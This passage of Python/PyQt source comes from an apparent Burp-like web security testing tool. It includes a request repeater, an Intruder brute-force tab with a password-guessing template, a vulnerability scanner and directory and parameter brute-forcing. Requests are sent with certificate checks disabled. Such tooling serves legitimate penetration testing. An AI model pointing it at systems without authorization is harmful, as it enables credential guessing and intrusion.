                f"QMenu::separator{{background:{T.BORDER};height:1px;margin:4px 8px;}}")

            a_method  = menu.addAction("⚙  Change Method…")
            a_add_hdr = menu.addAction("＋  Add Header…")
            a_del_hdr = menu.addAction("－  Remove Header…")
            menu.addSeparator()
            a_nl      = menu.addAction("↵  Insert New Line")
            a_bfy     = menu.addAction("✨  Beautify JSON / XML")
            a_cl      = menu.addAction("📐  Recalculate Content-Length")
            menu.addSeparator()
            a_copy_r  = menu.addAction("📋  Copy Request")
            a_curl    = menu.addAction("⌨  Copy as cURL")
            a_copy_u  = menu.addAction("🔗  Copy URL")
            menu.addSeparator()
            a_send_i  = menu.addAction("💣  Send to Intruder")
            a_crlf    = menu.addAction(
                "\\n  Hide \\r\\n Line Endings" if _crlf_view["on"]
                else "\\n  Show \\r\\n Line Endings")

            action = menu.exec(req_editor.mapToGlobal(pos))

            if action == a_method:
                methods = ["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"]
                m, ok = QInputDialog.getItem(tab,"Change Method","Method:",methods,
                    methods.index(method_box.currentText()) if method_box.currentText() in methods else 0,False)
                if ok and m:
                    method_box.setCurrentText(m)
            elif action == a_add_hdr:
                h, ok = QInputDialog.getText(tab,"Add Header","Header (Name: Value):",text="X-Custom: value")
                if ok and ":" in h:
                    _insert_header(h.strip())
            elif action == a_del_hdr:
                hds, _ = self._parse_raw_request(_get_raw())
                if hds:
                    nm, ok = QInputDialog.getItem(tab,"Remove Header","Select:",list(hds.keys()),0,False)
                    if ok: _remove_header(nm)
            elif action == a_nl:
                cur = req_editor.textCursor()
                cur.insertText("\n")
                req_editor.setTextCursor(cur)
                req_editor.setFocus()
            elif action == a_bfy:
                _beautify()
            elif action == a_cl:
                _recalc_cl()
            elif action == a_copy_r:
                QApplication.clipboard().setText(_get_raw())
            elif action == a_curl:
                _copy_as_curl()
            elif action == a_copy_u:
                QApplication.clipboard().setText(url_edit.text())
            elif action == a_send_i:
                hds2, bdy2 = self._parse_raw_request(_get_raw())
                self.intr_url.setText(url_edit.text())
                self.intr_method.setCurrentText(method_box.currentText())
                self.intr_headers.setPlainText("\n".join(f"{k}: {v}" for k,v in hds2.items()))
                self.intr_body.setPlainText((bdy2 or b"").decode("utf-8","replace"))
                self.tabs.setCurrentIndex(3)
            elif action == a_crlf:
                crlf_btn.setChecked(not _crlf_view["on"])

        def _copy_as_curl():
            hds, bdy = self._parse_raw_request(_get_raw())
            bstr = (bdy or b'').decode('utf-8', 'replace')
            curl = "curl -X " + method_box.currentText() + " '" + url_edit.text() + "'"
            for k2, v2 in hds.items():
                curl += " -H '" + k2 + ": " + v2 + "'"
            if bdy:
                curl += " -d '" + bstr + "'"
            QApplication.clipboard().setText(curl)

        req_editor.customContextMenuRequested.connect(_req_ctx_menu)
        req_vl.addWidget(req_editor, 1)
        split.addWidget(req_panel)

        # ── RESPONSE PANEL ──
        resp_panel = QWidget()
        resp_vl = QVBoxLayout(resp_panel); resp_vl.setContentsMargins(0,0,0,0); resp_vl.setSpacing(0)

        resp_hb = QWidget(); resp_hb.setFixedHeight(26)
        resp_hb.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        rohl = QHBoxLayout(resp_hb); rohl.setContentsMargins(10,0,6,0); rohl.setSpacing(4)
        _rt2 = QLabel("RESPONSE")
        _rt2.setStyleSheet(f"color:{T.TXT3};font-size:9px;font-weight:700;letter-spacing:2px;")
        rohl.addWidget(_rt2); rohl.addStretch()
        def _rsb(lbl, tip):
            b = QPushButton(lbl); b.setFixedHeight(18); b.setToolTip(tip)
            b.setStyleSheet(f"background:{T.SURFACE};color:{T.TXT2};"
                            f"border:1px solid {T.BORDER};border-radius:3px;font-size:10px;padding:0 7px;")
            return b
        cpy_resp_btn = _rsb("Copy","Copy response"); send_i_btn = _rsb("Intruder","Send to Intruder")
        rohl.addWidget(cpy_resp_btn); rohl.addWidget(send_i_btn)
        resp_vl.addWidget(resp_hb)

        resp_tabs = QTabWidget()
        resp_tabs.setStyleSheet(
            f"QTabWidget::pane{{border:none;background:{T.BG};}}"
            f"QTabBar::tab{{padding:4px 14px;font-size:10px;background:{T.PANEL};"
            f"color:{T.TXT3};border-bottom:2px solid transparent;}}"
            f"QTabBar::tab:selected{{color:{T.BLUE};border-bottom:2px solid {T.BLUE};}}"
            f"QTabBar::tab:hover:!selected{{background:{T.SURFACE};}}")

        def _ro(wrap=False, fs=10):
            e = QPlainTextEdit(); e.setReadOnly(True); e.setFont(mono_font(fs))
            if not wrap: e.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
            e.setStyleSheet(f"background:{T.BG};color:{T.CODE};border:none;padding:8px;font-family:{T.MONO};")
            return e

        raw_resp = _ro(); raw_resp.setPlaceholderText("Hit Send to see the response…")
        HTTPHighlighter(raw_resp.document())
        hdrs_resp = _ro(); body_resp = _ro(wrap=True); pretty_resp = _ro(wrap=True)
        hex_resp  = _ro(fs=9)
        resp_tabs.addTab(raw_resp,"Raw"); resp_tabs.addTab(hdrs_resp,"Headers")
        resp_tabs.addTab(body_resp,"Body"); resp_tabs.addTab(pretty_resp,"Pretty")
        resp_tabs.addTab(hex_resp,"Hex")
        resp_vl.addWidget(resp_tabs, 1)
        split.addWidget(resp_panel)
        split.setSizes([500, 500])
        rv.addWidget(split, 1)

        # ══ HELPERS ══
        BODY_CAPABLE_METHODS = {"POST", "PUT", "PATCH", "DELETE"}

        def _get_body_b() -> bytes:
            _, b2 = self._parse_raw_request(_get_raw()); return b2 or b""

        def _compute_cl_raw() -> str:
            """Return the canonical raw text with Content-Length updated,
            WITHOUT touching the editor display at all.
            Used by _do_send() so Send never re-applies marks to lines where
            the user manually removed them."""
            bb = _get_body_b()
            lines = _get_raw().split("\n")
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            found = False
            for i,l in enumerate(lines[:blank]):
                if l.lower().startswith("content-length"):
                    lines[i] = f"Content-Length: {len(bb)}"; found = True; break
            if not found and bb: lines.insert(blank, f"Content-Length: {len(bb)}")
            return "\n".join(lines)

        def _recalc_cl():
            """Update Content-Length AND refresh the editor display.
            Called by the 📐 Calc CL button and right-click menu — the user
            explicitly asked for a visual update so _set_raw is appropriate."""
            _set_raw(_compute_cl_raw())

        def _insert_header(hdr_txt: str):
            lines = _get_raw().split("\n")
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            lines.insert(blank, hdr_txt)
            _set_raw("\n".join(lines))

        def _remove_header(name: str):
            lines = _get_raw().split("\n")
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            new_lines = [l for i,l in enumerate(lines)
                         if not (0 < i < blank and l.lower().startswith(name.lower() + ":"))]
            _set_raw("\n".join(new_lines))

        def _beautify():
            _, bdy = self._parse_raw_request(_get_raw())
            bstr = (bdy or b"").decode("utf-8","replace")
            try: pretty = json.dumps(json.loads(bstr), indent=2, ensure_ascii=False)
            except Exception:
                try:
                    import xml.dom.minidom as _md
                    pretty = _md.parseString(bstr.encode()).toprettyxml(indent="  ")
                except Exception: return
            lines = _get_raw().split("\n")
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            _set_raw("\n".join(lines[:blank+1]) + pretty)

        def _maybe_add_content_length_zero(raw_text: str, new_method: str) -> str:
            """Burp behavior: switching the method dropdown to a body-capable
            method (POST/PUT/PATCH/DELETE) auto-adds 'Content-Length: 0' when
            there's no body and no Content-Length header yet."""
            if new_method not in BODY_CAPABLE_METHODS:
                return raw_text
            hds, bdy = self._parse_raw_request(raw_text)
            if bdy:
                return raw_text
            if any(k.lower() == 'content-length' for k in hds):
                return raw_text
            lines = raw_text.split('\n')
            blank = next((i for i, l in enumerate(lines) if i > 0 and not l.strip()), len(lines))
            lines.insert(blank, "Content-Length: 0")
            return '\n'.join(lines)

        # Method dropdown → first line sync
        def _sync_method(m2):
            lines = _get_raw().split('\n')
            if lines:
                parts = lines[0].split(' ', 2)
                p1 = parts[1] if len(parts) > 1 else '/'
                p2 = parts[2] if len(parts) > 2 else 'HTTP/1.1'
                lines[0] = f"{m2} {p1} {p2}"
                new_raw = '\n'.join(lines)
                new_raw = _maybe_add_content_length_zero(new_raw, m2)
                _set_raw(new_raw)
        method_box.currentTextChanged.connect(_sync_method)

        # HTTP version → first line sync
        def _sync_ver(v2):
            lines = _get_raw().split('\n')
            if lines:
                parts = lines[0].split(' ', 2)
                p0 = parts[0] if parts else 'GET'
                p1 = parts[1] if len(parts) > 1 else '/'
                lines[0] = f"{p0} {p1} {v2}"
                _set_raw('\n'.join(lines))
        http_ver.currentTextChanged.connect(_sync_ver)

        # Rename / dup / clear
        rename_btn.clicked.connect(lambda: (lambda n,ok: self.rep_tabs.setTabText(
            self.rep_tabs.currentIndex(), n[:28]) if ok and n else None)(
            QInputDialog.getText(tab,"Rename","Name:",text=self.rep_tabs.tabText(self.rep_tabs.currentIndex()))))
        dup_btn.clicked.connect(lambda: self._add_rep_tab(
            title=self.rep_tabs.tabText(self.rep_tabs.currentIndex())+" ②",
            method=method_box.currentText(), url=url_edit.text(),
            raw_request=_get_raw()))
        clr_btn.clicked.connect(lambda: [e.clear() for e in [raw_resp,hdrs_resp,body_resp,pretty_resp,hex_resp]]
                                 or status_lbl.setText("—") or time_lbl.setText("") or size_lbl.setText(""))
        copy_url_btn.clicked.connect(lambda: QApplication.clipboard().setText(url_edit.text()))
        cpy_resp_btn.clicked.connect(lambda: QApplication.clipboard().setText(raw_resp.toPlainText()))
        send_i_btn.clicked.connect(lambda: self.tabs.setCurrentIndex(3))

        # ══ SEND ══
        def _do_send():
            if _state["sending"]: return
            if not HAS_REQUESTS:
                raw_resp.setPlainText("❌ pip install requests"); return
            target = url_edit.text().strip()
            if not target.startswith(("http://","https://")):
                raw_resp.setPlainText("❌ URL must start with http:// or https://"); return
            # Get the raw text for sending. If Update Content-Length is on,
            # compute the updated CL via _compute_cl_raw() which ONLY returns
            # the corrected text — it never calls _set_raw() or _add_marks(),
            # so the editor display stays exactly as the user left it.
            # (The old code called _recalc_cl() here, which did call _set_raw()
            # → _add_marks(), re-adding \r\n markers to lines where the user
            # had manually removed them.)
            raw = _compute_cl_raw() if upd_cl_chk.isChecked() else _get_raw()
            hds, bdy = self._parse_raw_request(raw)
            body_b = bdy or b""
            skip = {"transfer-encoding","connection","proxy-connection","te","trailers","upgrade"}
            if upd_cl_chk.isChecked(): skip.add("content-length")
            h = {k2:v2 for k2,v2 in hds.items() if k2.lower() not in skip}
            if upd_cl_chk.isChecked() and body_b: h["Content-Length"] = str(len(body_b))
            sel_m = method_box.currentText()
            _state["sending"] = True
            send_btn.setEnabled(False); send_btn.setText("  ⏳ ")
            status_lbl.setText("…")
            force_h1 = h2_dn_chk.isChecked()

            def _worker():
                import time as _t; t0 = _t.time()
                try:
                    sess = requests.Session()
                    # CRITICAL: never inherit system proxy env vars.
                    # If the user has HTTPS_PROXY=http://127.0.0.1:8080 set
                    # (routing browser traffic through Kingception), requests
                    # would loop Repeater traffic back through the proxy →
                    # _forward() → "Max retries exceeded". trust_env=False
                    # bypasses HTTP_PROXY / HTTPS_PROXY / NO_PROXY entirely.
                    sess.trust_env = False
                    if force_h1 and target.startswith("https://"):
                        try:
                            from requests.adapters import HTTPAdapter
                            from urllib3.util.ssl_ import create_urllib3_context
                            class _H1(HTTPAdapter):
                                def init_poolmanager(self,*a,**kw):
                                    ctx=create_urllib3_context()
                                    ctx.set_alpn_protocols(["http/1.1"])
                                    kw["ssl_context"]=ctx
                                    super().init_poolmanager(*a,**kw)
                            sess.mount("https://",_H1())
                        except Exception: pass
                    resp = sess.request(sel_m, target, headers=h,
                        data=body_b or None, verify=False, timeout=30,
                        allow_redirects=redir_chk.isChecked(), stream=False)
                    return resp, _t.time()-t0, None
                except Exception as ex:
                    return None, _t.time()-t0, str(ex)

            def _done(res):
                _state["sending"] = False
                send_btn.setEnabled(True); send_btn.setText("  ▶  Send")
                resp, elapsed, err = res
                # Always show elapsed time — even connection errors have timing
                time_lbl.setText(f"{elapsed*1000:.0f}ms")
                if err:
                    el = err.lower().replace(" ","")
                    if "maxretriesexceeded" in el or "connectionerror" in el or "newconnectionerror" in el:
                        label = "ConnErr"
                        hint = (
                            "Connection failed — most likely cause: HTTPS_PROXY env var\n"
                            "is routing Repeater traffic back through Kingception (proxy loop).\n\n"
                            "Fix: run this before launching Kingception:\n"
                            "  unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY\n\n"
                            f"urllib3 error:\n{err}")
                    elif "timeout" in el or "timedout" in el:
                        label = "Timeout"
                        hint = f"Request timed out after {elapsed*1000:.0f} ms\n\n{err}"
                    elif "ssl" in el or "certificate" in el or "handshake" in el:
                        label = "SSLErr"
                        hint = f"TLS/SSL error — try enabling 'Force HTTP/1.1'\n\n{err}"
                    else:
                        label = "Err"
                        hint = err
                    status_lbl.setText(label)
                    status_lbl.setStyleSheet(
                        f"color:{T.RED};font-size:11px;font-family:{T.MONO};font-weight:700;")
                    size_lbl.setText("0 B")
                    raw_resp.setPlainText(f"❌ {label}:\n\n{hint}")
                    self._log(f"[Repeater] {sel_m} {target} → {label} ({elapsed*1000:.0f}ms)")
                    return
                sc = resp.status_code; sc_col = status_color(sc)
                status_lbl.setText(str(sc))
                status_lbl.setStyleSheet(
                    f"color:{sc_col};font-size:11px;font-family:{T.MONO};font-weight:700;")
                rb = resp.content; size_lbl.setText(f"{len(rb):,}B")
                try: vs = f"HTTP/{resp.raw.version/10:.1f}"
                except Exception: vs = "HTTP/1.1"
                raw_out = f"{vs} {sc} {resp.reason}\n"
                for k2,v2 in resp.headers.items(): raw_out += f"{k2}: {v2}\n"
                raw_out += f"\n{resp.text[:300_000]}"
                raw_resp.setPlainText(raw_out)
                hdrs_resp.setPlainText(
                    "\n".join(f"{k2}: {v2}" for k2,v2 in resp.headers.items()))
                body_resp.setPlainText(resp.text[:300_000])
                try:
                    pretty_resp.setPlainText(
                        json.dumps(resp.json(), indent=2, ensure_ascii=False))
                except Exception:
                    try:
                        import xml.dom.minidom as _md
                        pretty_resp.setPlainText(
                            _md.parseString(resp.content).toprettyxml(indent="  "))
                    except Exception:
                        pretty_resp.setPlainText(resp.text[:300_000])
                data = rb[:32768]; hl = []
                for i2 in range(0,len(data),16):
                    ch=data[i2:i2+16]
                    hp=" ".join(f"{b6:02x}" for b6 in ch).ljust(47)
                    ap="".join(chr(b6) if 32<=b6<127 else "." for b6 in ch)
                    hl.append(f"{i2:08x}  {hp}  |{ap}|")
                hex_resp.setPlainText("\n".join(hl) or "(no body)")
                self._log(
                    f"[Repeater] {sel_m} {target} → {sc} "
                    f"({elapsed*1000:.0f}ms, {len(rb):,}B)")

            future = self._thread_pool.submit(_worker)
            def _poll():
                if future.done():
                    try: _done(future.result())
                    except Exception as ex:
                        _state["sending"]=False; send_btn.setEnabled(True)
                        send_btn.setText("  ▶  Send"); raw_resp.setPlainText(f"❌ {ex}")
                else: QTimer.singleShot(40, _poll)
            QTimer.singleShot(40, _poll)

        send_btn.clicked.connect(_do_send)

        lbl2 = f"Tab {tab_n}" if title in ("New","Tab 1") else title[:22]
        idx2 = self.rep_tabs.addTab(tab, lbl2)
        self.rep_tabs.setCurrentIndex(idx2)
        return tab

    def _intruder_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(8, 8, 8, 8)

        top = QHBoxLayout()
        mode_g = QGroupBox("Attack Mode")
        mode_l = QVBoxLayout(mode_g)
        self.intr_mode = QComboBox()
        self.intr_mode.addItems([IntruderAttack.SNIPER, IntruderAttack.BATTERING,
                                 IntruderAttack.PITCHFORK, IntruderAttack.CLUSTER_BOMB])
        self.intr_mode.currentTextChanged.connect(self._on_intr_mode_change)
        mode_l.addWidget(self.intr_mode)
        self.mode_desc = QLabel()
        self.mode_desc.setWordWrap(True)
        self.mode_desc.setStyleSheet(f"color: {T.TXT2}; font-size: 11px; padding: 4px")
        mode_l.addWidget(self.mode_desc)
        top.addWidget(mode_g, 1)

        tg = QGroupBox("Target")
        tgl = QFormLayout(tg)
        self.intr_method = QComboBox()
        self.intr_method.addItems(["GET", "POST", "PUT", "DELETE", "PATCH"])
        self.intr_url = QLineEdit()
        self.intr_url.setPlaceholderText("https://target.com/login")
        self.intr_conc = QSpinBox()
        self.intr_conc.setRange(1, 50)
        self.intr_conc.setValue(10)
        self.intr_delay = QSpinBox()
        self.intr_delay.setRange(0, 10000)
        self.intr_delay.setSuffix(" ms")
        tgl.addRow("Method:", self.intr_method)
        tgl.addRow("URL:", self.intr_url)
        tgl.addRow("Threads:", self.intr_conc)
        tgl.addRow("Delay:", self.intr_delay)
        top.addWidget(tg, 2)
        v.addLayout(top)

        mid_sp = QSplitter(Qt.Orientation.Horizontal)
        v.addWidget(mid_sp)

        bw = QWidget()
        bv = QVBoxLayout(bw)
        bv.setContentsMargins(0, 0, 0, 0)
        lbl_h = QLabel("Headers (optional):")
        lbl_h.setStyleSheet(f"color: {T.TXT2}; font-size: 11px")
        bv.addWidget(lbl_h)
        self.intr_headers = QPlainTextEdit()
        self.intr_headers.setMaximumHeight(80)
        self.intr_headers.setFont(mono_font(10))
        self.intr_headers.setPlaceholderText("Content-Type: application/json\nCookie: session=abc")
        bv.addWidget(self.intr_headers)
        lbl_b = QLabel("Request Body (mark injection points with §PAYLOAD§):")
        lbl_b.setStyleSheet(f"color: {T.TXT2}; font-size: 11px")
        bv.addWidget(lbl_b)
        self.intr_body = QPlainTextEdit()
        self.intr_body.setFont(mono_font(10))
        self.intr_body.setPlaceholderText('username=admin&password=§PAYLOAD§\n\nJSON:\n{"user":"admin","pass":"§PAYLOAD§"}')
        HTTPHighlighter(self.intr_body.document())
        bv.addWidget(self.intr_body)
        mid_sp.addWidget(bw)

        pl_w = QWidget()
        pl_v = QVBoxLayout(pl_w)
        pl_v.setContentsMargins(0, 0, 0, 0)
        self.pl_tabs = QTabWidget()
        self.pl_tabs.setTabsClosable(True)
        self.pl_tabs.tabCloseRequested.connect(lambda i: self.pl_tabs.removeTab(i) if self.pl_tabs.count() > 1 else None)
        pl_v.addWidget(self.pl_tabs)
        add_pl = self._btn("➕ Payload List", h=26)
        add_pl.clicked.connect(self._add_payload_tab)
        pl_v.addWidget(add_pl)
        mid_sp.addWidget(pl_w)
        mid_sp.setSizes([700, 400])
        self._add_payload_tab()

        ah = QHBoxLayout()
        self.intr_start = self._btn("⚡ Start Attack", "purple", h=34)
        self.intr_stop = self._btn("⏹ Stop", "danger", h=34)
        self.intr_stop.setEnabled(False)
        ah.addWidget(self.intr_start)
        ah.addWidget(self.intr_stop)
        self.intr_prog = QProgressBar()
        self.intr_prog.setVisible(False)
        ah.addWidget(self.intr_prog, 1)
        v.addLayout(ah)

        res_sp = QSplitter(Qt.Orientation.Vertical)
        v.addWidget(res_sp)
        self.intr_tbl = QTableWidget(0, 6)
        self.intr_tbl.setHorizontalHeaderLabels(["#", "Payload", "Status", "Length", "Time", "Headers"])
        self.intr_tbl.setAlternatingRowColors(True)
        self.intr_tbl.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.intr_tbl.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.intr_tbl.horizontalHeader().setStretchLastSection(True)
        self.intr_tbl.customContextMenuRequested.connect(self._intr_ctx)
        res_sp.addWidget(self.intr_tbl)
        self.intr_resp_view = QPlainTextEdit()
        self.intr_resp_view.setReadOnly(True)
        self.intr_resp_view.setFont(mono_font(10))
        self.intr_resp_view.setMaximumHeight(160)
        self.intr_resp_view.setPlaceholderText("Click result row to preview response…")
        HTTPHighlighter(self.intr_resp_view.document())
        res_sp.addWidget(self.intr_resp_view)
        res_sp.setSizes([280, 160])

        self.intr_tbl.cellClicked.connect(lambda r, c: self.intr_resp_view.setPlainText(
            self._intr_resp.get(r, {}).get('response', '')))
        self.intr_start.clicked.connect(self._start_intruder)
        self.intr_stop.clicked.connect(self._stop_intruder)
        self._intr_resp = {}
        self._on_intr_mode_change(IntruderAttack.SNIPER)
        return w

    def _add_payload_tab(self, title=None):
        idx = self.pl_tabs.count() + 1
        t = QWidget()
        tv = QVBoxLayout(t)
        tv.setContentsMargins(4, 4, 4, 4)
        cat = QComboBox()
        cat.addItem("Custom")
        cat.addItems(list(Payloads.categories().keys()))
        tv.addWidget(cat)
        pe = QPlainTextEdit()
        pe.setFont(mono_font(10))
        pe.setPlaceholderText("One payload per line")
        tv.addWidget(pe)
        def on_cat(c):
            if c != "Custom":
                pe.setPlainText('\n'.join(Payloads.categories()[c]))
        cat.currentTextChanged.connect(on_cat)
        lf = self._btn("📂 Load File", h=26)
        def load_f():
            path, _ = QFileDialog.getOpenFileName(self, "Load Payloads", "", "Text (*.txt);;All (*)")
            if path:
                with open(path, 'r', errors='replace') as f:
                    pe.setPlainText(f.read())
        lf.clicked.connect(load_f)
        tv.addWidget(lf)
        self.pl_tabs.addTab(t, title or f"List {idx}")

    def _get_all_payload_lists(self) -> List[List[str]]:
        lists = []
        for i in range(self.pl_tabs.count()):
            tab = self.pl_tabs.widget(i)
            pe = tab.findChild(QPlainTextEdit)
            if pe:
                lists.append([p for p in pe.toPlainText().split('\n') if p.strip()])
        return lists

    def _on_intr_mode_change(self, mode: str):
        descs = {
            IntruderAttack.SNIPER: "One injection point, cycle through payload list 1.",
            IntruderAttack.BATTERING: "Replace ALL §PAYLOAD§ markers with the same payload.",
            IntruderAttack.PITCHFORK: "Multiple lists, used in parallel (zip). Requires one list per marker.",
            IntruderAttack.CLUSTER_BOMB: "All combinations across all payload lists (cartesian product).",
        }
        self.mode_desc.setText(descs.get(mode, ""))

    def _start_intruder(self):
        url = self.intr_url.text().strip()
        if not url:
            QMessageBox.warning(self, "Intruder", "Enter target URL")
            return
        lists = self._get_all_payload_lists()
        if not any(lists):
            QMessageBox.warning(self, "Intruder", "No payloads loaded")
            return
        if not HAS_REQUESTS:
            QMessageBox.warning(self, "Dep", "pip install requests")
            return
        self.intr_tbl.setRowCount(0)
        self._intr_resp.clear()
        total_est = len(lists[0]) if self.intr_mode.currentText() in (IntruderAttack.SNIPER, IntruderAttack.BATTERING) else min(len(lists[0]) if lists else 0, 9999)
        self.intr_prog.setVisible(True)
        self.intr_prog.setMaximum(max(total_est, 1))
        self.intr_prog.setValue(0)
        self.intr_start.setEnabled(False)
        self.intr_stop.setEnabled(True)
        self._intruder = IntruderAttack(
            mode=self.intr_mode.currentText(), url=url,
            method=self.intr_method.currentText(),
            headers_text=self.intr_headers.toPlainText(),
            template=self.intr_body.toPlainText(),
            payload_lists=lists,
            concurrency=self.intr_conc.value(),
            delay_ms=self.intr_delay.value())
        self._intruder.result.connect(self._intr_result)
        self._intruder.progress.connect(lambda d, t: self.intr_prog.setValue(d))
        self._intruder.finished.connect(self._intr_done)
        self._intruder.start()
        self._log(f"Intruder [{self.intr_mode.currentText()}] → {url}")

    def _intr_result(self, r: dict):
        row = self.intr_tbl.rowCount()
        self.intr_tbl.insertRow(row)
        for c, val in enumerate([str(r['idx']), r['payload'], str(r['status']),
                                 str(r['length']), f"{r['dur']:.3f}s",
                                 str(len(r.get('headers', {})))]):
            item = QTableWidgetItem(val)
            if c == 2:
                item.setForeground(QBrush(QColor(status_color(r['status']))))
            self.intr_tbl.setItem(row, c, item)
        self._intr_resp[row] = r

    def _intr_done(self, msg: str):
        self.intr_start.setEnabled(True)
        self.intr_stop.setEnabled(False)
        self.intr_prog.setVisible(False)
        self._log(msg)

    def _stop_intruder(self):
        if self._intruder:
            self._intruder.stop()
        self.intr_start.setEnabled(True)
        self.intr_stop.setEnabled(False)

    def _intr_ctx(self, pos):
        item = self.intr_tbl.itemAt(pos)
        if not item:
            return
        row = item.row()
        r = self._intr_resp.get(row, {})
        menu = QMenu()
        a_comp = menu.addAction("Send Response to Comparer")
        a_copy = menu.addAction("Copy Response")
        a_curl = menu.addAction("Copy as cURL")
        action = menu.exec(self.intr_tbl.viewport().mapToGlobal(pos))
        if action == a_comp:
            pass  # comp_a/comp_b removed with Comparer tab
            # self.tabs.setCurrentIndex(5)
        elif action == a_copy:
            QApplication.clipboard().setText(r.get('response', ''))
        elif action == a_curl:
            curl = f"curl -X {self.intr_method.currentText()} '{self.intr_url.text()}'"
            for hdr_line in self.intr_headers.toPlainText().split('\n'):
                if ':' in hdr_line:
                    curl += f" -H '{hdr_line.strip()}'"
            body_txt = self.intr_body.toPlainText().strip()
            if body_txt:
                curl += f" -d '{body_txt}'"
            QApplication.clipboard().setText(curl)

    # ---------- Scanner ----------
    def _scanner_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(8, 8, 8, 8)
        cfg = QHBoxLayout()
        cfg.addWidget(QLabel("Target:"))
        self.scan_url = QLineEdit()
        self.scan_url.setPlaceholderText("https://example.com")
        cfg.addWidget(self.scan_url)
        self.scan_start = self._btn("▶ Start Scan", "primary", h=30)
        self.scan_stop = self._btn("⏹ Stop", "danger", h=30)
        self.scan_stop.setEnabled(False)
        cfg.addWidget(self.scan_start)
        cfg.addWidget(self.scan_stop)
        v.addLayout(cfg)
        self.scan_prog = QProgressBar()
        v.addWidget(self.scan_prog)
        sp = QSplitter(Qt.Orientation.Vertical)
        self.scan_tree = QTreeWidget()
        self.scan_tree.setHeaderLabels(["Severity", "Type", "Description", "CWE", "CVSS"])
        self.scan_tree.setAlternatingRowColors(True)
        self.scan_tree.header().setStretchLastSection(True)
        sp.addWidget(self.scan_tree)
        self.scan_log = QPlainTextEdit()
        self.scan_log.setReadOnly(True)
        self.scan_log.setFont(mono_font(10))
        self.scan_log.setMaximumHeight(100)
        sp.addWidget(self.scan_log)
        sp.setSizes([420, 100])
        v.addWidget(sp)
        self.scan_start.clicked.connect(self._start_scanner)
        self.scan_stop.clicked.connect(self._stop_scanner)
        return w

    def _start_scanner(self):
        url = self.scan_url.text().strip()
        if not url:
            return
        self.scan_tree.clear()
        self.scan_log.clear()
        self.scan_start.setEnabled(False)
        self.scan_stop.setEnabled(True)
        self.scan_prog.setValue(0)
        self._scanner = Scanner(url, self.db)
        self._scanner.finding.connect(self._scan_finding)
        self._scanner.progress.connect(lambda p, m: (self.scan_prog.setValue(p), self.scan_log.appendPlainText(m)))
        self._scanner.log.connect(lambda m: self.scan_log.appendPlainText(m))
        self._scanner.done.connect(lambda n: (
            self.scan_start.setEnabled(True),
            self.scan_stop.setEnabled(False),
            self._log(f"Scan complete — {n} findings")
        ))
        self._scanner.start()
        self._log(f"Scanner started: {url}")

    def _scan_finding(self, r: dict):
        sev = r.get('severity', '')
        color = {'critical': T.PINK, 'high': T.RED, 'medium': T.YELLOW, 'low': T.CYAN, 'info': T.TXT2}.get(sev, T.TXT2)
        item = QTreeWidgetItem([sev, r.get('vuln_type', ''), r.get('desc', '')[:100],
                                r.get('cwe', ''), str(r.get('cvss', 0))])
        item.setForeground(0, QBrush(QColor(color)))
        self.scan_tree.addTopLevelItem(item)

    def _stop_scanner(self):
        if self._scanner:
            self._scanner.stop()
        self.scan_start.setEnabled(True)
        self.scan_stop.setEnabled(False)

    # ---------- Discovery ----------
    def _discovery_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(8, 8, 8, 8)

        cg = QGroupBox("Directory & File Bruteforce")
        cl = QVBoxLayout(cg)
        row = QHBoxLayout()
        row.addWidget(QLabel("Target:"))
        self._disc_url = QLineEdit()
        self._disc_url.setPlaceholderText("https://target.com")
        row.addWidget(self._disc_url)
        row.addWidget(QLabel("Extensions:"))
        self._disc_exts = QLineEdit("php,html,js,json,txt,bak")
        self._disc_exts.setFixedWidth(160)
        row.addWidget(self._disc_exts)
        self._disc_start = self._btn("▶ Start", "primary", 28)
        self._disc_stop = self._btn("⏹", "danger", 28)
        self._disc_stop.setEnabled(False)
        row.addWidget(self._disc_start)
        row.addWidget(self._disc_stop)
        cl.addLayout(row)
        self._disc_prog = QProgressBar()
        cl.addWidget(self._disc_prog)
        self._disc_tbl = QTableWidget(0, 4)
        self._disc_tbl.setHorizontalHeaderLabels(["URL", "Status", "Size", "Content-Type"])
        self._disc_tbl.horizontalHeader().setStretchLastSection(True)
        self._disc_tbl.setAlternatingRowColors(True)
        cl.addWidget(self._disc_tbl)
        v.addWidget(cg)

        pg = QGroupBox("Parameter Miner")
        pl = QVBoxLayout(pg)
        pr = QHBoxLayout()
        pr.addWidget(QLabel("Target:"))
        self._pm_url = QLineEdit()
        self._pm_url.setPlaceholderText("https://target.com/page?a=1")
        pr.addWidget(self._pm_url)
        self._pm_method = QComboBox()
        self._pm_method.addItems(["GET", "POST"])
        pr.addWidget(self._pm_method)
        pm_start = self._btn("▶ Mine", "purple", 28)
        pm_stop = self._btn("⏹", "danger", 28)
        pr.addWidget(pm_start)
        pr.addWidget(pm_stop)
        pl.addLayout(pr)
        self._pm_prog = QProgressBar()
        pl.addWidget(self._pm_prog)
        self._pm_tbl = QTableWidget(0, 3)
        self._pm_tbl.setHorizontalHeaderLabels(["Parameter", "Test Value", "Evidence"])
        self._pm_tbl.horizontalHeader().setStretchLastSection(True)
        pl.addWidget(self._pm_tbl)
        v.addWidget(pg)

        self._disc_start.clicked.connect(self._start_discovery)
        self._disc_stop.clicked.connect(lambda: self._discovery.stop() if self._discovery else None)
        pm_start.clicked.connect(self._start_pm)
        pm_stop.clicked.connect(lambda: self._param_miner.stop() if self._param_miner else None)
        return w

    def _start_discovery(self):
        url = self._disc_url.text().strip()
        if not url:
            return
        exts = [e.strip() for e in self._disc_exts.text().split(",") if e.strip()]
        self._disc_tbl.setRowCount(0)
        self._disc_prog.setValue(0)
        self._disc_start.setEnabled(False)
        self._disc_stop.setEnabled(True)
